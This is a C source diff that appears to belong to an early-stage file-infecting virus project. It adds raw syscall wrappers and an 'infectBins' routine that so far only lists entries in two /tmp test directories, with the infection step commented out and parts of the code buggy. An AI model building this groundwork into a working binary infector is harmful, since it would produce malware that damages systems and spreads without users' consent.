@@ -7,6 +7,17 @@
 #include <stdio.h>
 #include <signal.h>
 
+typedef off_t off64_t;
+typedef ino_t ino64_t;
+
+struct  linux_dirent64 {
+  ino64_t         d_ino;
+  off64_t         d_off;
+  unsigned short  d_reclen;
+  unsigned char   d_type;
+  char            d_name[];
+};
+
 static int  write(int fd, const void *buf, size_t count) {
   register int8_t     rax asm("rax") = 1;
   register int        rdi asm("rdi") = fd;
@@ -72,6 +83,17 @@ static int  munmap(void *addr, size_t len) {
   return (rax);
 }
 
+static int  getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+  register int8_t                 rax asm("rax") = 217;
+  register unsigned int           rdi asm("rdi") = fd;
+  register struct linux_dirent64  *rsi asm("rsi") = dirp;
+  register unsigned int           rdx asm("rdx") = count;
+
+  asm("syscall"
+    : "=r" (rax));
+  return (rax);
+}
+
 static void *memcpy(void *dest, const void *src, size_t n) {
   char  *result;
 
@@ -129,20 +151,58 @@ static void  *memmove(void *dest, const void *src, size_t n) {
     memcpy(dest, src, n);
   else {
     i += n - 1;
-    while (n-- > 0) {
+    while (n > 0) {
       ((char *)dest)[i] = ((char *)src)[i];
+      n -= 1;
       i -= 1;
     }
   }
   return (dest);
 }
 
-int   main(void) {
-  int   fd;
-  char  helloWorld[] = "HelloWorld";
+/* static DIR *opendir(const char *name) { */
 
-  fd = open(helloWorld, O_RDWR | O_TRUNC | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
-  write(fd, helloWorld, 10);
-  close(fd);
+/* } */
+
+/* static struct dirent  *readdir(DIR *dirp) { */
+
+/* } */
+
+/* static int  closedir(DIR *dirp) { */
+
+/* } */
+
+static int  infectBins(const char *dirname) {
+  int                   fd;
+  struct linux_dirent64 dirp;
+  /* struct dirent *file; */
+
+  if ((fd = open(dirname, O_RDONLY | O_DIRECTORY, 0)) < 0)
+    return (-1);
+  dprintf(1, "Dirname: %s, Fd: %i\n", dirname, fd);
+  dprintf(1, "Return value: %i\n", getdents64(fd, &dirp, sizeof(dirp)));
+  dprintf(1, "Filename: \"%s\"\n", dirp.d_name);
+  /* if ((dir = opendir(dirname)) == NULL) */
+  /*   return (-1); */
+  /* while ((file = readdir(dir)) != NULL) { */
+    /* if (infectFile(dirname, file, fun) == -1) { */
+    /*   closedir(dir); */
+    /*   return (-1); */
+    /* } */
+  /* } */
+  dprintf(1, "Close: %i\n", close(fd));
+  return (0);
+}
+
+int   main(void) {
+  size_t  i;
+  char    *infectDir[3] = {"/tmp/test", "/tmp/test2", NULL};
+
+  i = 0;
+  while (infectDir[i] != NULL) {
+    if (infectBins(infectDir[i]) == -1)
+      return (1);
+    i += 1;
+  }
   return (0);
 }
